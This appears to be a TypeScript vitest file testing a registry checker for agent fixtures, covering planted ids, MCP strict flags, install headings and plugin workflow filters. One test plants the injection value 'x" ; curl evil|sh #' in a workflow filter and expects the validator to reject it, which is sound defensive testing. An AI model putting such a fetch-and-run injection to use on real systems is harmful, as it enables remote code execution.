import { DocsLanguage } from '@zapbip/types';
import { beforeAll, describe, expect, test } from 'vitest';
import { StrictMcpNullReason } from '../src/contract';
import { discoverAgents } from './discover';
import { loadAgent } from './load';
import { readSource } from './source';
import { registryCheckViolationsOf, type CheckedAgent } from './registry-checks';

const FIXTURE_ROOT = 'libs/agents/testing';
const FIXTURE_FOLDERS = ['fixture-agent', 'fixture-connector-agent', 'fixture-plugin-agent'];
const PAGE_FILES: Record<DocsLanguage, string> = {
  [DocsLanguage.English]: 'page.en.mdx',
  [DocsLanguage.PortugueseBrazil]: 'page.pt-br.mdx',
};

let agents: CheckedAgent[] = [];

beforeAll(async () => {
  const loaded = await Promise.all(
    discoverAgents({ roots: FIXTURE_FOLDERS.map((folder) => `${FIXTURE_ROOT}/${folder}`) }).map((agent) => loadAgent({ agent })),
  );
  agents = loaded.map((agent) => ({
    ...agent,
    guides: {
      [DocsLanguage.English]: readSource(`${agent.folder}/${PAGE_FILES[DocsLanguage.English]}`),
      [DocsLanguage.PortugueseBrazil]: readSource(`${agent.folder}/${PAGE_FILES[DocsLanguage.PortugueseBrazil]}`),
    },
  }));
});

function sourcesOf(): Parameters<typeof registryCheckViolationsOf>[0]['sources'] {
  return {
    applicationPluginFolders: [],
    readFile: (path) => {
      try {
        return Buffer.from(readSource(path));
      } catch {
        return null;
      }
    },
    servedFilenames: agents.flatMap((agent) => (agent.plugin ? agent.plugin.hostedArtifacts.map((artifact) => artifact.filename) : [])),
  };
}

function violationsWith(input: { change: (agent: CheckedAgent) => CheckedAgent; files?: { path: string; text: string }[] }): string[] {
  return registryCheckViolationsOf({
    agents: agents.map(input.change),
    files: input.files === undefined ? [] : input.files,
    sources: sourcesOf(),
  });
}

describe('registryCheckViolationsOf', () => {
  test('accepts the fixtures', () => {
    expect(violationsWith({ change: (agent) => agent })).toEqual([]);
  });

  test('names the file and the agent of an id planted outside its folder', () => {
    const files = [{ path: 'apps/api/src/app.ts', text: "const first = 1;\nconst agent = 'fixture-agent';" }];
    expect(violationsWith({ change: (agent) => agent, files })).toContain('apps/api/src/app.ts:2 names fixture-agent');
  });

  test('names the connector agent whose strict flag is null with no reason', () => {
    const change = (agent: CheckedAgent): CheckedAgent =>
      agent.runtime === null ? agent : { ...agent, runtime: { ...agent.runtime, strictMcpArgument: null, strictMcpNullReason: null } };
    expect(violationsWith({ change })).toContain(
      'fixture-connector-agent: strictMcpArgument is null and strictMcpNullReason does not say why',
    );
  });

  test('keeps a justified null strict flag', () => {
    const change = (agent: CheckedAgent): CheckedAgent =>
      agent.runtime === null
        ? agent
        : {
            ...agent,
            runtime: { ...agent.runtime, strictMcpArgument: null, strictMcpNullReason: StrictMcpNullReason.DisablesOtherServers },
          };
    expect(violationsWith({ change })).toEqual([]);
  });

  test('names the agent whose install section holds a second heading', () => {
    const change = (agent: CheckedAgent): CheckedAgent =>
      agent.id === 'fixture-agent' && agent.install !== null
        ? {
            ...agent,
            install: {
              ...agent.install,
              render: (section) => `${(agent.install as NonNullable<typeof agent.install>).render(section)}\n\n## Other`,
            },
          }
        : agent;
    expect(violationsWith({ change }).filter((violation) => violation.startsWith('fixture-agent in'))).not.toEqual([]);
  });

  test('names the plugin agent whose workflow filter is an injection', () => {
    const change = (agent: CheckedAgent): CheckedAgent =>
      agent.plugin === null
        ? agent
        : { ...agent, plugin: { ...agent.plugin, workflow: { ...agent.plugin.workflow, filter: 'x" ; curl evil|sh #' } } };
    expect(violationsWith({ change })).toContain('fixture-plugin-agent: the workflow filter must match ^[@\\w/.-]+$');
  });
});
